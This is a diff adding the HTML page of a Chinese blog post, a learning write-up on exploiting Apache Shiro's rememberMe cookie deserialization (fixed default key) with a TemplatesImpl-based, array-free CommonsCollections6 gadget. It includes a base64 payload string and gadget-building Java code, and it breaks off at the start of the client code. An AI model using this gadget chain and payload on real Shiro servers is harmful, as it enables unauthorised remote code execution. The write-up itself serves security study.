@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="继续跟着P师傅的文章学习Java安全，这篇文章P师傅介绍了如何使用TemplatesImpl攻击Shiro。因为TemplatesImpl构造的利用链理论上可以执行任意代码，不受到对于链的限制，这几年内存马流行起来之后，对执行任意Java代码的需求日益强烈。 使用CommonsCollections6攻击ShiroShiro反序列化是近几年生命力最持久的漏洞之一了，说起来它的原理也比较简单：为了让">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TemplatesImpl在Shiro中的利用">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;12&#x2F;07&#x2F;TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="继续跟着P师傅的文章学习Java安全，这篇文章P师傅介绍了如何使用TemplatesImpl攻击Shiro。因为TemplatesImpl构造的利用链理论上可以执行任意代码，不受到对于链的限制，这几年内存马流行起来之后，对执行任意Java代码的需求日益强烈。 使用CommonsCollections6攻击ShiroShiro反序列化是近几年生命力最持久的漏洞之一了，说起来它的原理也比较简单：为了让">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;sGTxNPlgmib573M.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;dyU91e3BRIaOTCS.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;MrwU6glPmFYQLNx.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;dpJ5fBvjNgA61DW.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;n5UeQiAZabMumVC.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;qxjy5rXnacf1k4p.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;pyusvkoB4fZiVxQ.png">
+<meta property="og:updated_time" content="2021-12-07T13:34:37.639Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;s2.loli.net&#x2F;2021&#x2F;12&#x2F;07&#x2F;sGTxNPlgmib573M.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/12/07/TemplatesImpl在Shiro中的利用/"/>
+
+
+
+
+
+  <title>TemplatesImpl在Shiro中的利用 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/07/TemplatesImpl%E5%9C%A8Shiro%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TemplatesImpl在Shiro中的利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-07T09:56:01+08:00">
+                2021-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  17
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>继续跟着P师傅的文章学习Java安全，这篇文章P师傅介绍了如何使用TemplatesImpl攻击Shiro。因为TemplatesImpl构造的利用链理论上可以执行任意代码，不受到对于链的限制，这几年内存马流行起来之后，对执行任意Java代码的需求日益强烈。</p>
+<h2 id="使用CommonsCollections6攻击Shiro"><a href="#使用CommonsCollections6攻击Shiro" class="headerlink" title="使用CommonsCollections6攻击Shiro"></a>使用CommonsCollections6攻击Shiro</h2><p>Shiro反序列化是近几年生命力最持久的漏洞之一了，说起来它的原理也比较简单：<strong>为了让浏览器或服务器重启后不丢失用户状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro1.2.4版本之前内置了一个默认且固定的加密Key，导致攻击者可以伪造任意的rememberMeCookie，进而触发反序列化漏洞。</strong>为了演示漏洞，P师傅用Shiro1.2.4编写了一个超简单的登录应用。不引入其他干扰因素，没有使用任何Web框架，项目只有两个代码文件，index.jsp和login.jsp，依赖也仅有下面几个：</p>
+<ul>
+<li>shiro-core,shiro-web,这是shiro本身的依赖</li>
+<li>javax.servlet-api,jsp-api,这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖</li>
+<li>slf4j-api,slf4j-simple,这是为了显示shiro中的报错信息添加的依赖</li>
+<li>commons-logging,这是shiro中用到的一个接口，不添加会爆<code>java.lang.ClassNotFoundException:org.apache.commons.logging.LogFactory</code>错误</li>
+<li>commons-collections,为了演示反序列化漏洞，添加了commons-collections依赖。<br>github clone一下，进入到shirodemo目录，然后运行<code>mvn package</code>会将项目打包成war包，Tomcat的下载安装，参考<a href="https://blog.csdn.net/yangxingpa/article/details/58174598" target="_blank" rel="noopener">传送门</a>,这里我下载了installer，一路默认next。打包好的war包在shirodemo的target目录下，把war包复制到Tomcat的webapps目录下，然后访问<code>http://localhost:8080/shirodemo/</code>就会跳转到登录界面.利用IDEA启动war包maven项目参考<a href="https://blog.csdn.net/weixin_42216142/article/details/107046650" target="_blank" rel="noopener">传送门</a><br><img src="https://s2.loli.net/2021/12/07/sGTxNPlgmib573M.png" alt="1.png"><br>输入正确的账号密码，root/secret，成功登录。<br><img src="https://s2.loli.net/2021/12/07/dyU91e3BRIaOTCS.png" alt="1.png"><br>如果登录的时候选择了remember me的选项，登录成功后会返回一个rememberMe的cookie。攻击过程如下：</li>
+<li>使用以前学过的CommonsCollections利用链生成一个序列化的Payload</li>
+<li>使用Shiro默认Key进行加密</li>
+<li>将密文作文rememberMe的cookie发送给服务端<br>IDEA运行一下P师傅打包好的代码，得到这个编码后的字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gqP21xMOlsxEK3fa5wvPMUPdBW47A2Ei+AJjGfoUbSarHv4f8nrmMTiJsoAqNi7LSXaqbLxxzYS3o0Y9CIEOqwLweWE598s+fV52vGNZa4nj5ai+N/2WrT9FHr1YZbb3Ot98yGC8UmYutKYsMtgdugE/H5JPsQjIeIs+ZBGR0MwiJ+OsWIbEO11dQlIQZb6jbEVYjVfakXyuWk0Hr8SJq9kSpbpWNwRHRqFnJwbG6mso8e8LXnN4DQ/Ee/phjASmWJppNr3FmIE4UgNIeGlb3LyUyxRIQ6YJ0PJ8S+X7N2Mq1TgjJPwexpZ+0gyVMu2RifXK7dX4yu60V4DjADylHOYF22KAC8miSQXVe8NM4EvzVZpEuogaLP6tBMdJuVJF2PswBEc/NJ5oKDVir+gQjRpJb+LC0FQcsTxlJjcirDU0e6hzJbWU/9KPLU8psjSYkFHukXIrVuL4QsQjOFCGfU+Qo0etO4azxF3FkNBS/tTEQNMk6fby2f6oF/7wSSE7/ER6cdkNSPjcn+I2YUF+Qet+t3nGotmhcKIo/E7jgnV1vskH4t9j5kk5DdZcSD5y53mNfeneRgpSoN/wdUB8iYZR0imzq5NMME5XWqr1rWOSyJkm70ACfFlVrVPxYLfTDSn77V0KYaeT3RVcL8Kuj6+5C6SJoHQDnR1JoL1/4Ph/k6LXV/kSoWS4oPwf0ztgSBFYido/oSa09RZmAy9JTB36s8whzDvyTBwZvPZrmWg+kWmnXnlz06lAq9EwKuSBz8u8W91nk9gvaAOXP2bE/NZtICNkXqLTsS1dPPwN8Lawc/jkG4w5IAFSc6s1BhNDeeGnWGMKLAyyG7J8K6pSItUJ0mL0oRq/b2gpjXNJS82h4DYd9Ktdwbf9bv+wai6CSIDoj4MWLK2u2vPaCgQ0VgDbc9+zChDA4OK/b1AQHD8zUhfxzk2Q31a9h0zS0drFQhDJ6aTs1UcjvEmjDpL9vbzZENT6AQTz6ScojvXNhVTYB47PiYam9bOJHUxeIVK32lmwasQUeTKLmgu88YhFuqFdfcjBHamCBNy1QfeI7J+UHmkbIw9o7gPY/fbbJQpE/dyfts3lZLQ0rUNGOB62vK31Yw8hIZkVKWXDumeImit8IeL28JXSMEgiHVT9PlVmATcykYnlUeXEUYsgOEGN9sFUr0Jo4Mq4PItYdMl6d1bHuyPlmfgJfxBMd6VSf4Gl/vqXXvilnvbWPo4mVXrmibTF4uKM0RIVh8dbhwxgTj+LygBKbX6fnHaPjCpJpI57iyQpN31zWoNzqSVPmNH8sKKmeJ3HUWKCTX+UPOVsvshMZF2SLzey+i1k7WmQM2MY/aHu0gtLqbXGhHIsJjLl6Jr/b9xGjt6LaNqFkujKQZpFznepxFe68b17PlVBz2dLajiNGM/EpT5/tyBqOzZ6k+nfwiQc9yA+mlrOhi8BmOon+mU8bW0trPMAZ0ppiAo1kensTxVi8Mmp2KTbTuFHgWW1+uRtVxV67bem41U+wHvvWgRSE/UNfdVMxQxFzfMFw6R9ehOpXfzn9978gAXsTZNXffQyhoJKya7ICEnvpGEZXjNKHP/3PRbwqKgssomR5OqZcjjFZn6DORlrfKOmi88WK4d8rfodLJnCdXXrLkcpqPICMEgeEdizbSSf8U4c+mP3OAnAzcYsoyC29tfOxX9JO0Fg/warC6Jqi92aHR1WIRNcUk19Jl1rhR4YzH1O</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><strong>这里tomcat和bp监听的端口冲突了，修改下</strong>找到conf子目录下的server.xml，搜索下8080，将这个端口改为别的就行了，这里我改成了8090.P师傅将步骤1和2写成了Client0.java，用到的Gadget是CC6。github的地址<a href="https://github.com/phith0n/JavaThings" target="_blank" rel="noopener">传送门</a>.这里用tamcat直接运行war包复现的时候没有出现对应的错误，改用IDEA运行shirodemo。配置过程前面安装Tomcat的时候写有。<br>运行tomcat后发现中文乱码，解决方法参考<a href="https://blog.csdn.net/mr_liuhailong/article/details/110264765" target="_blank" rel="noopener">传送门</a></p>
+<hr>
+<p>将生成的Base64编码作为rememberMe的值(不做url编码)，通过bp重放一下，并没有如愿的弹出计算器，而是在运行shirodemo的IDEA中出现了报错<br><img src="https://s2.loli.net/2021/12/07/MrwU6glPmFYQLNx.png" alt="1.png"></p>
+<h2 id="冲突与限制"><a href="#冲突与限制" class="headerlink" title="冲突与限制"></a>冲突与限制</h2><p>找到冲突的倒数第一行，是这个类<code>org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass</code>,搜索一下，可以发现这是一个ObjectInputStream的子类，重写了resolveClass方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassResolvingObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassResolvingObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass osc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownClassException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"Unable to load ObjectStreamClass ["</span> + osc + <span class="string">"]: "</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>resolveClass是反序列化中用来查找类的方法，准确说，读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来寻找对应的java.lang.Class对象。<br>对比一下它的父类，也就是ObjectInputStream类中的resolvClass方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        String name = desc.getName();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">            <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cl;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>区别是前者用的是<code>org.apache.shiro.util.ClassUtils#forName</code>(内部实际使用到了<code>org.apache.catalina.loader.ParallelWebappClassLoader#loadClass</code>),而后者用的是Java原生的<code>Class.forName</code>.在捕获异常的位置下个断点，看看是哪个类触发了异常。调试的时候出了个<code>org.apache.catalina.startup.Catalina.stopServer 未配置关闭端口。通过OS信号关闭服务器。服务器未关闭</code>,打开conf下的server.xml，搜索-1，将这个端口改为8005然后重启即可调试。bp再次发包，发现触发异常时，osc的名字为<code>[Lorg.apache.commons.collections.Transformer;</code>,如图：<br><img src="https://s2.loli.net/2021/12/07/dpJ5fBvjNgA61DW.png" alt="1.png"><br>可以看到出现异常时加载的类名为<code>[Lorg.apache.commons.collections.Transformer;</code>。这个类名其实表示的就是<code>org.apache.commons.collections.Transformer</code>数组。因此网上很多文章就给出结论：<code>Class.forName</code>支持加载数组，而<code>ClassLoader.loadClass</code>不支持加载数组，这个区别导致了问题。实际上，经过P师傅调试，这中间涉及到大量Tomcat对类加载的处理逻辑，篇幅问题没有在这个pdf中写出，但是推荐了文章，可以亲自阅读并调试，也许会有更深入的理解</p>
+<ul>
+<li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a><br>这里P师傅给出了最终结论：<strong>如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误</strong>。这就解释了为什么<code>CommonsCollections</code>无法利用，因为其中用到了Transformer数组(第三方)<h2 id="构造不含数组的反序列化Gadget"><a href="#构造不含数组的反序列化Gadget" class="headerlink" title="构造不含数组的反序列化Gadget"></a>构造不含数组的反序列化Gadget</h2>为了解决这个问题，Orange在其文章中给出了使用JRMP的利用方法<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">传送门</a>,但是Java安全漫谈还没有讲到JRMP，并且JRMP需要外联服务器，利用起来会受到限制，能不能想其他办法呢？<strong>这篇文章最开始提到的TemplatesImpl就粉墨登场啦</strong>。在字节码加载篇中学习了，可以通过下面这几行代码执行一段Java的字节码:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;<span class="string">"...bytescode"</span>&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure>
+而上一篇中讲了利用<code>InvokerTransformer</code>调用<code>TemplatesImpl#newTransformer</code>方法：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(obj),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+不过这里仍然用到了Transformer数组，并不符合利用条件。怎么去除Transformer数组呢？wh1t3p1g在<a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">这篇文章</a>中给出了一个行之有效的方法。回顾一下，在CommonsCollections6中，用到了一个类<code>TiedMapEntry</code>，它的构造方法接受两个参数，参数一是一个Map，参数二是一个对象key。<code>TiedMapEntry</code>类有个getValue方法，调用了map的get方法，并传入了key。当这个map是LazyMap的时候，其get方法就是触发transform的关键点。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//LazyMap#get</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">this</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+以往构造CommonsCollection Gadget的时候，对LazyMap方法的key参数是不关心的，因为通常Transformer数组的首个对象是ConstantTransformer，通过ConstantTransformer来初始化恶意对象。但是此时已经不能用Transformer数组了，也就不能用ConstantTransformer了。但是仔细看看LazyMap的get方法，这个参数key会被传到transform()里面，所以它可以扮演ConstantTransformer在Transformer数组中的角色–一个简单的对象传递者。回过头来看看前面的Transform数组：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(obj),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+现在<code>new ConstantTransformer(obj)</code>这一步可以去掉了。只需要把obj设置为TiedMapEntry的key就可以代替。那么数组长度就变成1，所以数组也不需要了。这个过程其实挺巧的，而且和前面的知识紧密结合起来了。利用这个方法，来改造一下CommonsCollections6。代码P师傅已经全部发在github上面，下面跟着走一走改造思路。<h2 id="改造CommonsCollections6为CommonsCollectionsShiro"><a href="#改造CommonsCollections6为CommonsCollectionsShiro" class="headerlink" title="改造CommonsCollections6为CommonsCollectionsShiro"></a>改造CommonsCollections6为CommonsCollectionsShiro</h2>首先还是创建TemplatesImpl对象<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;<span class="string">"bytescode"</span>&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure>
+然后创建一个用来调用newTransformer方法的InvokerTransformer，需要注意的是，此时先传入一个无害方法，避免恶意方法在构造Gadget的时候触发：(P师傅这个put方法确实会触发利用链，这里设置很有必要)<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"getClass"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>
+再把前面的CommonsCollections6的代码复制过来，改上面说到的点。还有就是上面说到的，把<code>TiedMapEntry的key</code>改为前面创建的<code>TemplatesImpl</code>对象<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map outerMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, obj);</span><br><span class="line"></span><br><span class="line">Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">expMap.put(tme, <span class="string">"valuevalue"</span>);</span><br><span class="line"></span><br><span class="line">outerMap.clear();</span><br><span class="line">setFieldValue(transformer, <span class="string">"iMethodName"</span>, <span class="string">"newTransformer"</span>);</span><br></pre></td></tr></table></figure>
+和之前的CommonsCollections6不同的是，之前使用了<code>outerMap.remove</code>来移除key的副作用，现在通过<code>outerMap.clear()</code>来清除，效果相同。最后将<code>InvokerTransformer</code>的方法从getClass换成newTransformer，就完成了Payload的构造。完整的代码在shiroAttack下的CommonsCollectionsShiro.java。<h2 id="使用CommonsCollectionsShiro攻击Shiro"><a href="#使用CommonsCollectionsShiro攻击Shiro" class="headerlink" title="使用CommonsCollectionsShiro攻击Shiro"></a>使用CommonsCollectionsShiro攻击Shiro</h2>P师傅配套写了个Client.java来装配上面的CommonsColletionsShiro<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        